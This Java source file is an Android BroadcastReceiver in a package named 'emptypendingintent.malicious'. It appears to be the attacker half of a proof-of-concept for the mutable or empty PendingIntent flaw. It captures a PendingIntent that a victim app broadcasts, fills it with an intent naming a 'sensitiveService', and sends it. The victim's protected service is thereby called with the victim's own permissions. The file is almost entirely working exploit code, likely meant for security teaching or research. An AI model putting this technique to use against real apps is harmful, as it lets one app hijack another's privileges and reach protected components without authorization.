package com.emptypendingintent.malicious;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.SystemClock;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Chronometer;
import android.widget.TextView;

import java.util.Locale;

public class MaliciousReceiver extends BroadcastReceiver {

    private Context context = null;
    private PendingIntent pi = null;
    private Chronometer chronometer;
    private TextView chronoText;
    private Button button;

    public MaliciousReceiver(Chronometer chronometer, TextView chronoText, Button button) {
        this.chronometer = chronometer;
        this.chronoText = chronoText;
        this.button = button;

        configureChronometer(this.chronometer);
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("Malicious", "Receiver Called !");
        Bundle bundle = intent.getBundleExtra("bundle");

        this.context = context;
        this.pi = bundle.getParcelable("pendingIntent");

        chronoText.setVisibility(View.VISIBLE);
        button.setVisibility(View.VISIBLE);

        chronometer.setBase(SystemClock.elapsedRealtime());
        chronometer.start();
    }

    public void SendServiceRequest(){

        if(context == null || pi == null)
            return;

        // Creation of the intent to call the sensitive Service
        Intent sensitiveIntent = new Intent("action.com.emptypendingintent.sensitiveService");

        try {
            pi.send(context, 0, sensitiveIntent);
            Log.d("Malicious", "Service Called !");
        } catch (PendingIntent.CanceledException e) {
            e.printStackTrace();
        }

        chronoText.setVisibility(View.INVISIBLE);
        button.setVisibility(View.INVISIBLE);
        chronometer.stop();
        chronometer.setText("");

    }

    private void configureChronometer(Chronometer chrono){
        chrono.setOnChronometerTickListener(cArg -> {
            long time = SystemClock.elapsedRealtime() - cArg.getBase();
            int h   = (int)(time /3600000);

            if( h > 0){
                if( h == 1)
                    cArg.setText(String.format( Locale.ENGLISH,"%d hour ago", h));
                else
                    cArg.setText(String.format( Locale.ENGLISH,"%d hours ago", h));
                return;
            }

            int m = (int)(time - h*3600000)/60000;

            if( m > 0){
                if( m == 1)
                    cArg.setText(String.format( Locale.ENGLISH,"%d minute ago", m));
                else
                    cArg.setText(String.format( Locale.ENGLISH,"%d minutes ago", m));
                return;
            }

            int s = (int)(time - h*3600000- m*60000)/1000 ;

            if( s > 2)
                cArg.setText(String.format( Locale.ENGLISH,"%d seconds ago", s));
            else
                cArg.setText(String.format( Locale.ENGLISH,"%d second ago", s));
        });

        chronometer.setText("");
    }
}
